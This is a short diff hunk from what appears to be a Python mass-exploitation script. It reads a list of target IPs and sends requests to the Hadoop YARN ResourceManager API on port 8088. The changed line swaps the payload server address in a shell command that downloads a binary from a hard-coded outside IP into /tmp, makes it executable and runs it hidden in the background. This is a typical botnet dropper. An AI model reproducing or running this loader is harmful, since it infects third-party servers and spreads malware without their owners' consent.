@@ -8,7 +8,7 @@ from threading import Thread
 ips = open(sys.argv[1], "r").readlines()
 queue = Queue()
 queue_count = 0
-cmd = "cd /tmp && wget -q http://168.222.251.98:1283/bins/x86_64 -O .x && chmod 777 .x && nohup ./.x >/dev/null 2>&1 &"
+cmd = "cd /tmp && wget -q http://72.61.48.229:1283/bins/x86_64 -O .x && chmod 777 .x && nohup ./.x >/dev/null 2>&1 &"
 def rtek(host):
     try:
         url = 'http://' + host + ':8088/ws/v1/cluster/apps/new-application'
